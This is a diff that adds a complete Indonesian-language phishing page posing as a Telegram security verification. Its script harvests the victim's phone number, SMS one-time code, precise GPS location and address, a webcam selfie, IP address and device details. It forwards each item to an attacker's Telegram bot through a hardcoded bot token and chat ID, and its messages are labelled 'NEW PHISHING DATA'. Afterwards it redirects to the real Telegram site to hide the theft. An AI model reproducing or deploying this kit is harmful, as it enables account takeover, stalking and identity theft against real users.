@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram • Verifikasi Keamanan</title>
+    
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #2A2A72, #009FFD);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        /* Card Utama */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            padding: 30px 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 2px rgba(0, 255, 255, 0.5), 0 0 30px rgba(0, 255, 255, 0.5);
+            animation: cardGlow 3s infinite;
+        }
+
+        @keyframes cardGlow {
+            0%, 100% { box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 2px rgba(0, 255, 255, 0.5), 0 0 30px rgba(0, 255, 255, 0.5); }
+            50% { box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 4px rgba(0, 255, 255, 0.8), 0 0 60px rgba(0, 255, 255, 0.8); }
+        }
+
+        /* Header Telegram */
+        .telegram-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(0, 159, 253, 0.2);
+        }
+
+        .telegram-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(145deg, #2AABEE, #229ED9);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            box-shadow: 0 10px 20px rgba(42, 171, 238, 0.4);
+        }
+
+        .telegram-title h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .telegram-title p {
+            font-size: 14px;
+            color: #666;
+            margin-top: 3px;
+        }
+
+        /* Steps Indicator */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #ddd;
+            z-index: 1;
+        }
+
+        .step {
+            position: relative;
+            z-index: 2;
+            background: white;
+            padding: 0 10px;
+            text-align: center;
+        }
+
+        .step-number {
+            width: 35px;
+            height: 35px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #999;
+            margin: 0 auto 8px;
+            border: 2px solid #ddd;
+        }
+
+        .step.active .step-number {
+            background: #2AABEE;
+            color: white;
+            border-color: #2AABEE;
+            box-shadow: 0 0 20px rgba(42, 171, 238, 0.5);
+        }
+
+        .step.completed .step-number {
+            background: #4CAF50;
+            color: white;
+            border-color: #4CAF50;
+        }
+
+        .step-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+        }
+
+        .step.active .step-label {
+            color: #2AABEE;
+        }
+
+        /* Form Section */
+        .form-section {
+            display: none;
+            animation: slideIn 0.5s ease;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        /* Input Groups */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .input-label i {
+            color: #2AABEE;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            background: #f8f9fa;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #2AABEE;
+            box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.2);
+            background: white;
+        }
+
+        /* Phone Input */
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code {
+            width: 100px;
+            padding: 16px;
+            background: #f0f0f0;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            font-weight: 600;
+            color: #333;
+            text-align: center;
+        }
+
+        .phone-input .input-field {
+            flex: 1;
+        }
+
+        /* Location Card */
+        .location-card {
+            background: linear-gradient(145deg, #f0f8ff, #e6f3ff);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px solid #2AABEE;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .location-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .location-header i {
+            font-size: 24px;
+            color: #2AABEE;
+        }
+
+        .location-detail {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 10px;
+        }
+
+        .location-label {
+            font-weight: 600;
+            color: #555;
+        }
+
+        .location-value {
+            font-family: monospace;
+            color: #2AABEE;
+        }
+
+        /* Camera Section */
+        .camera-container {
+            background: #1a1a1a;
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 3px solid #2AABEE;
+        }
+
+        #videoElement {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            background: #000;
+        }
+
+        .camera-overlay {
+            position: relative;
+        }
+
+        .camera-guide {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            border: 3px solid rgba(42, 171, 238, 0.5);
+            border-radius: 20px;
+            pointer-events: none;
+            animation: scan 2s infinite;
+        }
+
+        @keyframes scan {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(42, 171, 238, 0.5); }
+            50% { box-shadow: 0 0 0 20px rgba(42, 171, 238, 0); }
+        }
+
+        .camera-status {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Button */
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(145deg, #2AABEE, #229ED9);
+            box-shadow: 0 10px 20px rgba(42, 171, 238, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(42, 171, 238, 0.6);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a1a;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            animation: slideUp 0.3s ease;
+            border-left: 4px solid #2AABEE;
+        }
+
+        .toast.success { border-left-color: #4CAF50; }
+        .toast.error { border-left-color: #f44336; }
+        .toast.warning { border-left-color: #ff9800; }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translate(-50%, 100px);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+
+        /* Token Info (Hidden) */
+        .token-info {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast" style="display: none;">
+        <i class="fas fa-info-circle"></i>
+        <span id="toastMessage"></span>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <!-- Header -->
+            <div class="telegram-header">
+                <div class="telegram-icon">
+                    <i class="fab fa-telegram-plane"></i>
+                </div>
+                <div class="telegram-title">
+                    <h2>Verifikasi Keamanan</h2>
+                    <p><i class="fas fa-shield-alt"></i> Akun Anda memerlukan verifikasi</p>
+                </div>
+            </div>
+
+            <!-- Steps -->
+            <div class="steps">
+                <div class="step active" id="step1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Login</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">SMS</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Lokasi</div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="step-number">4</div>
+                    <div class="step-label">Selfie</div>
+                </div>
+                <div class="step" id="step5">
+                    <div class="step-number">5</div>
+                    <div class="step-label">Selesai</div>
+                </div>
+            </div>
+
+            <!-- Step 1: Login -->
+            <div class="form-section active" id="step1Form">
+                <div class="input-group">
+                    <div class="input-label">
+                        <i class="fas fa-phone-alt"></i>
+                        <span>Nomor Telepon</span>
+                    </div>
+                    <div class="phone-input">
+                        <div class="country-code">+62</div>
+                        <input type="tel" class="input-field" id="phone" placeholder="81234567890" maxlength="12">
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" id="btnStep1">
+                    <i class="fas fa-arrow-right"></i>
+                    Lanjutkan
+                </button>
+            </div>
+
+            <!-- Step 2: SMS OTP -->
+            <div class="form-section" id="step2Form">
+                <div class="input-group">
+                    <div class="input-label">
+                        <i class="fas fa-key"></i>
+                        <span>Kode Verifikasi (SMS)</span>
+                    </div>
+                    <input type="text" class="input-field" id="otp" placeholder="Masukkan 6 digit kode" maxlength="6">
+                    <p style="font-size: 12px; color: #666; margin-top: 5px;">
+                        <i class="fas fa-clock"></i> Kode akan kadaluarsa dalam 5 menit
+                    </p>
+                </div>
+
+                <div style="display: flex; gap: 10px;">
+                    <button class="btn btn-primary" id="btnStep2" style="flex: 2;">
+                        <i class="fas fa-check"></i>
+                        Verifikasi
+                    </button>
+                    <button class="btn" id="resendOtp" style="flex: 1; background: #f0f0f0; color: #333;">
+                        <i class="fas fa-redo-alt"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 3: Location -->
+            <div class="form-section" id="step3Form">
+                <div class="location-card">
+                    <div class="location-header">
+                        <i class="fas fa-map-marked-alt"></i>
+                        <h3>Lokasi Anda Terdeteksi</h3>
+                    </div>
+                    
+                    <div class="location-detail">
+                        <span class="location-label">Latitude:</span>
+                        <span class="location-value" id="latValue">-6.2088</span>
+                    </div>
+                    <div class="location-detail">
+                        <span class="location-label">Longitude:</span>
+                        <span class="location-value" id="lngValue">106.8456</span>
+                    </div>
+                    <div class="location-detail">
+                        <span class="location-label">Akurasi:</span>
+                        <span class="location-value" id="accValue">±10 meter</span>
+                    </div>
+                    <div class="location-detail">
+                        <span class="location-label">Alamat:</span>
+                        <span class="location-value" id="addressValue">Mengambil alamat...</span>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" id="btnStep3">
+                    <i class="fas fa-check-circle"></i>
+                    Konfirmasi Lokasi
+                </button>
+            </div>
+
+            <!-- Step 4: Face Capture -->
+            <div class="form-section" id="step4Form">
+                <div class="camera-container">
+                    <video id="videoElement" autoplay playsinline></video>
+                    <div class="camera-guide"></div>
+                    <div class="camera-status">
+                        <span class="spinner"></span>
+                        <span id="cameraStatus">Mengakses kamera...</span>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" id="btnStep4">
+                    <i class="fas fa-camera"></i>
+                    Ambil Foto
+                </button>
+            </div>
+
+            <!-- Step 5: Success -->
+            <div class="form-section" id="step5Form">
+                <div style="text-align: center; padding: 30px 0;">
+                    <div style="width: 100px; height: 100px; background: #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pulse 2s infinite;">
+                        <i class="fas fa-check" style="font-size: 50px; color: white;"></i>
+                    </div>
+                    <h2 style="margin-bottom: 10px;">Verifikasi Berhasil!</h2>
+                    <p style="color: #666; margin-bottom: 30px;">Akun Anda telah diverifikasi. Anda akan dialihkan ke Telegram...</p>
+                    <div class="spinner" style="width: 40px; height: 40px;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Token Info - UDAH DIISI BANG! -->
+    <div class="token-info" id="tokenInfo">
+        <input type="hidden" id="botToken" value="8584054633:AAHLawlKAw0riDO9H4mx2LZHxNJipML_-As">
+        <input type="hidden" id="ownerId" value="8543064325">
+    </div>
+
+    <script>
+        // ============== KONFIGURASI ==============
+        const BOT_TOKEN = document.getElementById('botToken').value;
+        const OWNER_ID = document.getElementById('ownerId').value;
+        
+        // Data yang terkumpul
+        let collectedData = {
+            phone: '',
+            otp: '',
+            location: {
+                lat: null,
+                lng: null,
+                accuracy: null,
+                address: ''
+            },
+            facePhoto: null,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timestamp: new Date().toISOString(),
+            ip: 'Mengambil IP...'
+        };
+
+        // ============== UTILITY FUNCTIONS ==============
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            
+            toast.className = `toast ${type}`;
+            toastMessage.innerHTML = message;
+            toast.style.display = 'flex';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                collectedData.ip = data.ip;
+            } catch (e) {
+                collectedData.ip = 'Unknown';
+                            }
+        }
+
+        // ============== TELEGRAM BOT FUNCTIONS ==============
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Message sent to Telegram');
+                } else {
+                    console.error('❌ Failed to send message');
+                }
+            } catch (e) {
+                console.error('❌ Error sending to Telegram:', e);
+            }
+        }
+
+        async function sendPhotoToTelegram(photoBase64, caption) {
+            try {
+                // Convert base64 to blob
+                const base64Data = photoBase64.split(',')[1];
+                const byteCharacters = atob(base64Data);
+                const byteNumbers = new Array(byteCharacters.length);
+                
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: 'image/jpeg'});
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', OWNER_ID);
+                formData.append('photo', blob, 'face_capture.jpg');
+                formData.append('caption', caption);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Photo sent to Telegram');
+                } else {
+                    console.error('❌ Failed to send photo');
+                }
+            } catch (e) {
+                console.error('❌ Error sending photo:', e);
+            }
+        }
+
+        // ============== STEP NAVIGATION ==============
+        let currentStep = 1;
+        const totalSteps = 5;
+
+        function updateSteps(step) {
+            for (let i = 1; i <= totalSteps; i++) {
+                const stepEl = document.getElementById(`step${i}`);
+                const formEl = document.getElementById(`step${i}Form`);
+                
+                if (i < step) {
+                    stepEl.classList.remove('active');
+                    stepEl.classList.add('completed');
+                    formEl.classList.remove('active');
+                } else if (i === step) {
+                    stepEl.classList.add('active');
+                    stepEl.classList.remove('completed');
+                    formEl.classList.add('active');
+                } else {
+                    stepEl.classList.remove('active', 'completed');
+                    formEl.classList.remove('active');
+                }
+            }
+            currentStep = step;
+        }
+
+        // ============== STEP 1: PHONE ==============
+        document.getElementById('btnStep1').addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value.trim();
+            
+            if (!phone || phone.length < 10) {
+                showToast('Masukkan nomor telepon yang valid!', 'error');
+                return;
+            }
+
+            if (!/^\d+$/.test(phone)) {
+                showToast('Nomor telepon hanya boleh angka!', 'error');
+                return;
+            }
+
+            collectedData.phone = '+62' + phone;
+            
+            // Kirim ke Telegram
+            const message = `
+<b>🔔 NEW PHISHING DATA - STEP 1</b>
+═══════════════════════
+📱 <b>Phone:</b> ${collectedData.phone}
+🌐 <b>IP:</b> ${collectedData.ip}
+🖥️ <b>User Agent:</b> ${collectedData.userAgent}
+📱 <b>Platform:</b> ${collectedData.platform}
+🌍 <b>Language:</b> ${collectedData.language}
+⏰ <b>Time:</b> ${collectedData.timestamp}
+═══════════════════════
+            `;
+            
+            await sendToTelegram(message);
+            showToast('Kode verifikasi telah dikirim!', 'success');
+            
+            updateSteps(2);
+        });
+
+        // ============== STEP 2: OTP ==============
+        document.getElementById('btnStep2').addEventListener('click', async () => {
+            const otp = document.getElementById('otp').value.trim();
+            
+            if (!otp || otp.length !== 6) {
+                showToast('Masukkan 6 digit kode OTP!', 'error');
+                return;
+            }
+
+            if (!/^\d+$/.test(otp)) {
+                showToast('Kode OTP hanya boleh angka!', 'error');
+                return;
+            }
+
+            collectedData.otp = otp;
+            
+            // Kirim ke Telegram
+            const message = `
+<b>🔐 NEW PHISHING DATA - STEP 2</b>
+═══════════════════════
+📱 <b>Phone:</b> ${collectedData.phone}
+🔑 <b>OTP Code:</b> ${collectedData.otp}
+🌐 <b>IP:</b> ${collectedData.ip}
+⏰ <b>Time:</b> ${collectedData.timestamp}
+═══════════════════════
+            `;
+            
+            await sendToTelegram(message);
+            showToast('Kode OTP terverifikasi!', 'success');
+            
+            updateSteps(3);
+            getLocation();
+        });
+
+        // Resend OTP
+        document.getElementById('resendOtp').addEventListener('click', () => {
+            showToast('Kode verifikasi telah dikirim ulang!', 'success');
+        });
+
+        // ============== STEP 3: LOCATION ==============
+        function getLocation() {
+            if (navigator.geolocation) {
+                showToast('Mengambil lokasi Anda...', 'info');
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        collectedData.location.lat = position.coords.latitude;
+                        collectedData.location.lng = position.coords.longitude;
+                        collectedData.location.accuracy = position.coords.accuracy;
+                        
+                        document.getElementById('latValue').textContent = position.coords.latitude.toFixed(6);
+                        document.getElementById('lngValue').textContent = position.coords.longitude.toFixed(6);
+                        document.getElementById('accValue').textContent = `±${Math.round(position.coords.accuracy)} meter`;
+                        
+                        // Get address from coordinates using reverse geocoding
+                        try {
+                            const response = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`
+                            );
+                            const data = await response.json();
+                            
+                            if (data.display_name) {
+                                collectedData.location.address = data.display_name;
+                                document.getElementById('addressValue').textContent = data.display_name.substring(0, 50) + '...';
+                            } else {
+                                collectedData.location.address = 'Alamat tidak ditemukan';
+                                document.getElementById('addressValue').textContent = 'Alamat tidak ditemukan';
+                            }
+                        } catch (e) {
+                            console.error('Geocoding error:', e);
+                            collectedData.location.address = 'Gagal mengambil alamat';
+                            document.getElementById('addressValue').textContent = 'Gagal mengambil alamat';
+                        }
+                        
+                        showToast('Lokasi berhasil didapatkan!', 'success');
+                    },
+                    (error) => {
+                        let errorMsg = 'Gagal mengambil lokasi';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'Izin lokasi ditolak';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'Lokasi tidak tersedia';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'Timeout mengambil lokasi';
+                                break;
+                        }
+                        showToast(errorMsg, 'error');
+                        
+                        // Set default values
+                        collectedData.location.lat = 'Tidak tersedia';
+                        collectedData.location.lng = 'Tidak tersedia';
+                        document.getElementById('latValue').textContent = 'Tidak tersedia';
+                        document.getElementById('lngValue').textContent = 'Tidak tersedia';
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                showToast('Browser tidak mendukung geolokasi', 'error');
+            }
+        }
+
+        document.getElementById('btnStep3').addEventListener('click', async () => {
+            if (!collectedData.location.lat || collectedData.location.lat === 'Tidak tersedia') {
+                showToast('Mengambil lokasi... Silakan tunggu', 'warning');
+                return;
+            }
+            
+            // Kirim ke Telegram
+            const message = `
+<b>📍 NEW PHISHING DATA - STEP 3</b>
+═══════════════════════
+📱 <b>Phone:</b> ${collectedData.phone}
+🔑 <b>OTP:</b> ${collectedData.otp}
+📍 <b>Location:</b>
+   • Lat: ${collectedData.location.lat}
+   • Lng: ${collectedData.location.lng}
+   • Accuracy: ${collectedData.location.accuracy} meter
+   • Address: ${collectedData.location.address}
+🌐 <b>IP:</b> ${collectedData.ip}
+⏰ <b>Time:</b> ${collectedData.timestamp}
+═══════════════════════
+            `;
+            
+            await sendToTelegram(message);
+            showToast('Lokasi dikonfirmasi!', 'success');
+            
+            updateSteps(4);
+            initCamera();
+        });
+
+        // ============== STEP 4: FACE CAPTURE ==============
+        let videoStream = null;
+
+        async function initCamera() {
+            try {
+                // Check if mediaDevices is supported
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error('Browser tidak mendukung akses kamera');
+                }
+                
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('videoElement');
+                video.srcObject = videoStream;
+                
+                // Wait for video to be ready
+                video.onloadedmetadata = () => {
+                    video.play();
+                    document.getElementById('cameraStatus').innerHTML = '<i class="fas fa-check-circle" style="color: #4CAF50;"></i> Kamera siap';
+                };
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                showToast('Gagal mengakses kamera: ' + err.message, 'error');
+                document.getElementById('cameraStatus').innerHTML = '<i class="fas fa-exclamation-triangle" style="color: #f44336;"></i> Kamera tidak tersedia';
+                
+                // Disable camera button
+                document.getElementById('btnStep4').disabled = true;
+            }
+        }
+
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('videoElement');
+                
+                // Create canvas with video dimensions
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                
+                // Draw video frame to canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Add timestamp to image
+                context.font = '16px Arial';
+                context.fillStyle = 'white';
+                context.shadowColor = 'black';
+                context.shadowBlur = 4;
+                context.fillText(new Date().toLocaleString(), 10, canvas.height - 20);
+                
+                // Convert to base64 with lower quality for faster upload
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                resolve(photoData);
+            });
+        }
+
+        document.getElementById('btnStep4').addEventListener('click', async () => {
+            if (!videoStream) {
+                showToast('Kamera belum siap!', 'warning');
+                return;
+            }
+            
+            // Show capturing status
+            showToast('Mengambil foto...', 'info');
+            document.getElementById('btnStep4').disabled = true;
+            
+            try {
+                // Capture photo
+                const photo = await capturePhoto();
+                collectedData.facePhoto = photo;
+                
+                // Stop camera
+                if (videoStream) {
+                    videoStream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                    document.getElementById('videoElement').srcObject = null;
+                }
+                
+                // Kirim ke Telegram
+                const caption = `
+<b>📸 NEW PHISHING DATA - STEP 4 (FACE CAPTURE)</b>
+═══════════════════════
+📱 <b>Phone:</b> ${collectedData.phone}
+🔑 <b>OTP:</b> ${collectedData.otp}
+📍 <b>Location:</b> ${collectedData.location.lat}, ${collectedData.location.lng}
+🌐 <b>IP:</b> ${collectedData.ip}
+⏰ <b>Time:</b> ${collectedData.timestamp}
+═══════════════════════
+                `;
+                
+                await sendPhotoToTelegram(photo, caption);
+                showToast('Foto berhasil dikirim!', 'success');
+                
+                updateSteps(5);
+                
+                // Step 5: Final send
+                setTimeout(() => {
+                    sendFinalData();
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Capture error:', error);
+                showToast('Gagal mengambil foto', 'error');
+                document.getElementById('btnStep4').disabled = false;
+            }
+        });
+
+        // ============== STEP 5: FINAL ==============
+        async function sendFinalData() {
+            // Gather additional browser info
+            const screenInfo = {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth
+            };
+            
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkInfo = connection ? {
+                type: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt
+            } : 'Tidak tersedia';
+            
+            const finalMessage = `
+<b>✅ PHISHING COMPLETED - ALL DATA</b>
+═══════════════════════
+📱 <b>PHONE:</b> ${collectedData.phone}
+🔑 <b>OTP:</b> ${collectedData.otp}
+📍 <b>LOCATION:</b>
+   • Lat: ${collectedData.location.lat}
+   • Lng: ${collectedData.location.lng}
+   • Accuracy: ${collectedData.location.accuracy} meter
+   • Address: ${collectedData.location.address}
+🌐 <b>IP ADDRESS:</b> ${collectedData.ip}
+🖥️ <b>USER AGENT:</b> ${collectedData.userAgent}
+📱 <b>PLATFORM:</b> ${collectedData.platform}
+🌍 <b>LANGUAGE:</b> ${collectedData.language}
+🖥️ <b>SCREEN:</b> ${screenInfo.width}x${screenInfo.height}
+📶 <b>NETWORK:</b> ${typeof networkInfo === 'object' ? networkInfo.type + ' ' + networkInfo.downlink + 'Mbps' : networkInfo}
+⏰ <b>TIMESTAMP:</b> ${collectedData.timestamp}
+═══════════════════════
+            `;
+            
+            await sendToTelegram(finalMessage);
+            
+            // Show final toast
+            showToast('Semua data terkirim! Mengalihkan...', 'success');
+            
+            // Redirect after 5 seconds
+            setTimeout(() => {
+                window.location.href = 'https://telegram.org';
+            }, 5000);
+        }
+
+        // ============== INITIALIZATION ==============
+        window.onload = async () => {
+            // Show loading toast
+            showToast('Memuat halaman aman...', 'info');
+            
+            await getIP();
+            
+            // Auto focus phone input
+            document.getElementById('phone').focus();
+            
+            // Enter key handlers
+            document.getElementById('phone').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnStep1').click();
+                }
+            });
+            
+            document.getElementById('otp').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    document.getElementById('btnStep2').click();
+                }
+            });
+            
+            // Auto tab to OTP after phone input
+            document.getElementById('phone').addEventListener('input', (e) => {
+                if (e.target.value.length >= 10) {
+                    // Optional: auto move to next step after phone
+                }
+            });
+            
+            // Auto move between OTP digits (optional enhancement)
+            document.getElementById('otp').addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            });
+            
+            console.log('✅ Phishing page initialized');
+            console.log('🤖 Bot Token:', BOT_TOKEN.substring(0, 10) + '...');
+            console.log('👤 Owner ID:', OWNER_ID);
+        };
+
+        // Prevent form submission on enter
+        document.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA') {
+                e.preventDefault();
+            }
+        });
+
+        // Clean up camera on page unload
+        window.addEventListener('beforeunload', () => {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
